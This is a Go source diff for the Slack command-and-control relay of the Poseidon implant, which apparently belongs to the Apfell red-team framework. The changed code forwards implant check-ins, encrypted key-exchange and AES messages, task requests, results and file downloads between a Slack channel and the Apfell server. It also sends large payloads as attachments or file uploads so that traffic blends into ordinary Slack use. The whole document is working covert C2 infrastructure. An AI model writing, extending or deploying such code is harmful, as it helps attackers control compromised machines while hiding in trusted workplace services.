@@ -3,9 +3,17 @@
 package servers
 
 import (
+	"bytes"
+	"encoding/base64"
 	"encoding/json"
+	"fmt"
+	"github.com/xorrior/poseidon/pkg/utils/structs"
+	"io/ioutil"
 	"log"
+	"math"
+	"net/http"
 	"os"
+	"time"
 
 	"github.com/nlopes/slack"
 )
@@ -73,6 +81,14 @@ func (s SlackC2) GetChannelID() string {
 	return s.ChannelID
 }
 
+func (s SlackC2) GetApiHandle() *slack.Client {
+	return s.ApiHandle
+}
+
+func (s *SlackC2) SetApiHandle(newClient *slack.Client) {
+	s.ApiHandle = newClient
+}
+
 func (s SlackC2) GetNextTask(apfellID string) []byte {
 	//place holder
 	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", s.ApfellBaseURL(), apfellID)
@@ -115,8 +131,7 @@ func (s *SlackC2) postRESTResponse(urlEnding string, data []byte) []byte {
 //htmlPostData HTTP POST function
 func (s *SlackC2) htmlPostData(urlEnding string, sendData []byte) []byte {
 	url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), urlEnding)
-	//log.Println("Sending POST request to url: ", url)
-	s.Websocketlog(fmt.Sprintln("Sending POST request to: ", url))
+	s.GetApiHandle().Debugln(fmt.Sprintln("Sending POST request to: ", url))
 
 	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
 	contentLength := len(sendData)
@@ -125,12 +140,12 @@ func (s *SlackC2) htmlPostData(urlEnding string, sendData []byte) []byte {
 	resp, err := client.Do(req)
 
 	if err != nil {
-		s.Websocketlog(fmt.Sprintf("Error sending POST request: %s", err.Error()))
+		s.GetApiHandle().Debugln(fmt.Sprintf("Error sending POST request: %s", err.Error()))
 		return make([]byte, 0)
 	}
 
 	if resp.StatusCode != 200 {
-		s.Websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
+		s.GetApiHandle().Debugln(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
 		return make([]byte, 0)
 	}
 
@@ -139,7 +154,7 @@ func (s *SlackC2) htmlPostData(urlEnding string, sendData []byte) []byte {
 	body, err := ioutil.ReadAll(resp.Body)
 
 	if err != nil {
-		s.Websocketlog(fmt.Sprintf("Error reading response body: %s", err.Error()))
+		s.GetApiHandle().Debugln(fmt.Sprintf("Error reading response body: %s", err.Error()))
 		return make([]byte, 0)
 	}
 
@@ -148,25 +163,25 @@ func (s *SlackC2) htmlPostData(urlEnding string, sendData []byte) []byte {
 
 //htmlGetData - HTTP GET request for data
 func (s *SlackC2) htmlGetData(url string) []byte {
-	//log.Println("Sending HTML GET request to url: ", url)
+	s.GetApiHandle().Debugln("Sending HTML GET request to url: ", url)
 	client := &http.Client{}
 	var respBody []byte
 
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
-		s.Websocketlog(fmt.Sprintf("Error creating http request: %s", err.Error()))
+		s.GetApiHandle().Debugln(fmt.Sprintf("Error creating http request: %s", err.Error()))
 		return make([]byte, 0)
 	}
 
 	resp, err := client.Do(req)
 
 	if err != nil {
-		s.Websocketlog(fmt.Sprintf("Error completing GET request: %s", err.Error()))
+		s.GetApiHandle().Debugln(fmt.Sprintf("Error completing GET request: %s", err.Error()))
 		return make([]byte, 0)
 	}
 
 	if resp.StatusCode != 200 {
-		s.Websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
+		s.GetApiHandle().Debugln(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
 		return make([]byte, 0)
 	}
 
@@ -179,7 +194,66 @@ func (s *SlackC2) htmlGetData(url string) []byte {
 }
 
 func (s *SlackC2) handleResponseMessage(timestamp string, data []byte) {
+	if len(data) < 4000 {
+		// If less than 4k bytes, send a normal message
 
+		_, _, _, err := s.GetApiHandle().SendMessage(s.GetChannelID(), slack.MsgOptionTS(timestamp), slack.MsgOptionText(string(data), true))
+		if err != nil {
+			s.GetApiHandle().Debugf("Unable to post message: %s", err.Error())
+			return
+		}
+
+	} else if len(data) > 4000 && len(data) < 8000 {
+		// Send an attachment
+		attachment := slack.Attachment{
+			Color:         "",
+			Fallback:      "",
+			CallbackID:    "",
+			ID:            0,
+			AuthorID:      "",
+			AuthorName:    "",
+			AuthorSubname: "",
+			AuthorLink:    "",
+			AuthorIcon:    "",
+			Title:         "",
+			TitleLink:     "",
+			Pretext:       "",
+			Text:          string(data),
+			ImageURL:      "",
+			ThumbURL:      "",
+			Fields:        nil,
+			Actions:       nil,
+			MarkdownIn:    nil,
+			Footer:        "",
+			FooterIcon:    "",
+			Ts:            "",
+		}
+
+		_, _, _, err := s.GetApiHandle().SendMessage(s.GetChannelID(), slack.MsgOptionTS(timestamp), slack.MsgOptionText("",true), slack.MsgOptionAttachments(attachment))
+		if err != nil {
+			s.GetApiHandle().Debugf("Unable to post message: %s", err.Error())
+			return
+		}
+	} else {
+		// Data larger than 8K will be uploaded as a file
+		params := slack.FileUploadParameters{
+			File:            "newmessage.json",
+			Content:         string(data),
+			Reader:          nil,
+			Filetype:        "",
+			Filename:        "newmessage",
+			Title:           "",
+			InitialComment:  "",
+			Channels:        []string{s.GetChannelID()},
+			ThreadTimestamp: timestamp,
+		}
+
+		_, err := s.GetApiHandle().UploadFile(params)
+		if err != nil {
+			s.GetApiHandle().Debugf("Unable to post message: %s", err.Error())
+			return
+		}
+	}
 }
 
 func (s *SlackC2) handleMessage(message interface{}) interface{} {
@@ -187,6 +261,7 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 
 	switch m.MType {
 	case CheckInMsg:
+		s.GetApiHandle().Debugln("Received CheckIn message")
 		resp := s.htmlPostData("api/v1.3/callbacks/", []byte(m.Data))
 
 		// Create the msg to respond to the client
@@ -197,11 +272,12 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 		return re
 
 	case EKE:
-		s.ApiHandle.Debugf("Received EKE message with IDType: %d", m.IDType)
+		s.GetApiHandle().Debugf("Received EKE message with IDType: %d", m.IDType)
+		s.GetApiHandle().Debugf("Message: %+v\n", m)
 		resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/EKE/%s", m.ID), []byte(m.Data))
 
 		if len(resp) == 0 {
-			s.ApiHandle.Debugln("Empty response received from apfell. ...")
+			s.GetApiHandle().Debugln("Empty response received from apfell. ...")
 			break
 		}
 
@@ -211,9 +287,11 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 
 		return re
 	case AES:
+		s.GetApiHandle().Debugln("Received AES message")
+		s.GetApiHandle().Debugf("Message: %+v\n", m)
 		resp := s.htmlPostData(fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", m.ID), []byte(m.Data))
 		if len(resp) == 0 {
-			s.ApiHandle.Debugf("Received empty response from apfell")
+			s.GetApiHandle().Debugf("Received empty response from apfell")
 			break
 		}
 
@@ -224,10 +302,12 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 		return re
 
 	case TaskMsg:
+		s.GetApiHandle().Debugln("Received task message")
+		s.GetApiHandle().Debugf("Message: %+v\n", m)
 		resp := s.GetNextTask(m.ID)
 
 		if len(resp) == 0 {
-			s.ApiHandle.Debugln("Received empty response from Apfell.... retrying ")
+			s.GetApiHandle().Debugln("Received empty response from Apfell.... retrying ")
 			time.Sleep(time.Duration(s.PollingInterval()) * time.Second)
 
 			resp = s.GetNextTask(m.ID)
@@ -240,7 +320,8 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 		return re
 
 	case ResponseMsg:
-		s.ApiHandle.Debugln("Received Task response msg")
+		s.GetApiHandle().Debugln("Received Task response msg")
+		s.GetApiHandle().Debugf("Message: %+v\n", m)
 		resp := s.htmlPostData(fmt.Sprintf("api/v1.3/responses/%s", m.ID), []byte(m.Data))
 
 		re := Message{}
@@ -250,7 +331,8 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 		return re
 
 	case FileMsg:
-		s.ApiHandle.Debugln("Received file msg")
+		s.GetApiHandle().Debugln("Received file msg")
+		s.GetApiHandle().Debugf("Message: %+v\n", m)
 		endpoint := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", m.ID, m.Tag)
 		url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), endpoint)
 		resp := s.htmlGetData(url)
@@ -265,7 +347,7 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 	return Message{}
 }
 
-func (s *SlackC2) Run(config interface{}) {
+func (s SlackC2) Run(config interface{}) {
 
 	cf := config.(C2Config)
 	s.SetKey(cf.SlackAPIToken)
@@ -277,33 +359,35 @@ func (s *SlackC2) Run(config interface{}) {
 	// Set debug and logging options
 	f, _ := os.Create(s.LogFile)
 	logger := log.New(f, "poseidon-slackc2: ", log.Lshortfile|log.LstdFlags)
-	api := slack.New(s.GetKey(), slack.OptionDebug(s.Debug), slack.OptionLog(logger))
-	s.ApiHandle = api
-	// Join the channel
-	chn, err := api.JoinChannel(s.GetChannelID())
-	if err != nil {
-		api.Debugln("Unable to join channel: ", s.GetChannelID())
-		os.Exit(-1)
-	}
 
-	rtm := api.NewRTM()
+	s.SetApiHandle(slack.New(s.GetKey(), slack.OptionDebug(s.Debug), slack.OptionLog(logger)))
+	// Join the channel
+	/*_, err := api.JoinChannel(s.GetChannelID())
+
+	if err != nil {
+		s.GetApiHandle().Debugf("Unable to join channel: %s, err: %s", s.GetChannelID(), err.Error())
+		os.Exit(-1)
+	}*/
+
+	rtm := s.GetApiHandle().NewRTM()
 	go rtm.ManageConnection()
 
 	// Listen for messages from clients
 
 	for msg := range rtm.IncomingEvents {
-		api.Debugln("New event received ...")
+		s.GetApiHandle().Debugln("New event received ...")
 
 		switch ev := msg.Data.(type) {
 		case *slack.HelloEvent:
 			// Bye felicia
 			break
 		case *slack.ConnectedEvent:
-			api.Debugln("Connected to workspace...")
+			s.GetApiHandle().Debugln("Connected to workspace...")
+			//s.GetApiHandle().PostMessage(s.GetChannelID(), slack.MsgOptionText("poseidon-online", false))
 			break
 		case *slack.MessageEvent:
-			api.Debugf("Received new message event: %+v\n", ev)
-			//TODO: Handle Messages
+			//s.GetApiHandle().Debugf("Received new message event: %+v\n", ev)
+
 			if len(ev.Text) != 0 && len(ev.Attachments) == 0 && len(ev.Files) == 0 {
 				// Normal text message with no attachments and no files
 				// Save the timestamp for the tag
@@ -314,21 +398,27 @@ func (s *SlackC2) Run(config interface{}) {
 				err := json.Unmarshal([]byte(ev.Text), &msg)
 
 				if err != nil {
-					api.Debugf("Error unmarshaling data from message text: %s", err.Error())
+					s.GetApiHandle().Debugf("Error unmarshaling data from message text: %s", err.Error())
 					break
 				}
 
-				resp := s.handleMessage(msg)
+				if msg.Client {
 
-				respMsg := resp.(Message)
-				rawResp, err := json.Marshal(respMsg)
+					resp := s.handleMessage(msg)
 
-				if err != nil {
-					api.Debugf("Error marshaling data from response message: %s", err.Error())
-					break
+					respMsg := resp.(Message)
+					respMsg.Client = false
+					rawResp, err := json.Marshal(respMsg)
+
+					if err != nil {
+						s.GetApiHandle().Debugf("Error marshaling data from response message: %s", err.Error())
+						break
+					}
+
+					go s.handleResponseMessage(ts, rawResp)
 				}
 
-				go s.handleResponseMessage(ts, rawResp)
+
 			} else if len(ev.Attachments) > 0 {
 				// Grab the first attachment and save the time stamp
 				att := ev.Attachments[0]
@@ -338,52 +428,60 @@ func (s *SlackC2) Run(config interface{}) {
 
 				err := json.Unmarshal([]byte(att.Text), &msg)
 				if err != nil {
-					api.Debugf("Error unmarshaling data from message text: %s", err.Error())
+					s.GetApiHandle().Debugf("Error unmarshaling data from message text: %s", err.Error())
 					break
 				}
 
-				resp := s.handleMessage(msg)
+				if msg.Client {
 
-				respMsg := resp.(Message)
-				rawResp, err := json.Marshal(respMsg)
+					resp := s.handleMessage(msg)
 
-				if err != nil {
-					api.Debugf("Error marshaling data from response message: %s", err.Error())
-					break
+					respMsg := resp.(Message)
+					respMsg.Client = false
+					rawResp, err := json.Marshal(respMsg)
+
+					if err != nil {
+						s.GetApiHandle().Debugf("Error marshaling data from response message: %s", err.Error())
+						break
+					}
+
+					go s.handleResponseMessage(ts, rawResp)
 				}
-
-				go s.handleResponseMessage(ts, rawResp)
 			} else if len(ev.Files) > 0 {
 				// Grab the first file and save the time stamp
 				slackFile := ev.Files[0]
 				ts := ev.Timestamp
 
-				var fileContents []byte
-				err := api.GetFile(slackFile.URLPrivateDownload, fileContents)
+				var fileContents bytes.Buffer
+				err := s.GetApiHandle().GetFile(slackFile.URLPrivateDownload, &fileContents)
 
 				if err != nil {
-					api.Debugf("Unable to retrieve file: %s ", err.Error())
+					s.GetApiHandle().Debugf("Unable to retrieve file: %s ", err.Error())
 					break
 				}
 				msg := Message{}
-				err = json.Unmarshal(fileContents, &msg)
+				err = json.Unmarshal(fileContents.Bytes(), &msg)
 
 				if err != nil {
-					api.Debugf("Error unmarshaling data from message text: %s", err.Error())
+					s.GetApiHandle().Debugf("Error unmarshaling data from message text: %s", err.Error())
 					break
 				}
 
-				resp := s.handleMessage(msg)
+				if msg.Client {
 
-				respMsg := resp.(Message)
-				rawResp, err := json.Marshal(respMsg)
+					resp := s.handleMessage(msg)
 
-				if err != nil {
-					api.Debugf("Error marshaling data from response message: %s", err.Error())
-					break
+					respMsg := resp.(Message)
+					respMsg.Client = false
+					rawResp, err := json.Marshal(respMsg)
+
+					if err != nil {
+						s.GetApiHandle().Debugf("Error marshaling data from response message: %s", err.Error())
+						break
+					}
+
+					go s.handleResponseMessage(ts, rawResp)
 				}
-
-				go s.handleResponseMessage(ts, rawResp)
 			}
 
 			break
@@ -391,4 +489,9 @@ func (s *SlackC2) Run(config interface{}) {
 		}
 	}
 
+}
+
+func (s SlackC2) ConvertEncoding(old string) string {
+	decoded, _ := base64.URLEncoding.DecodeString(old)
+	return base64.StdEncoding.EncodeToString(decoded)
 }
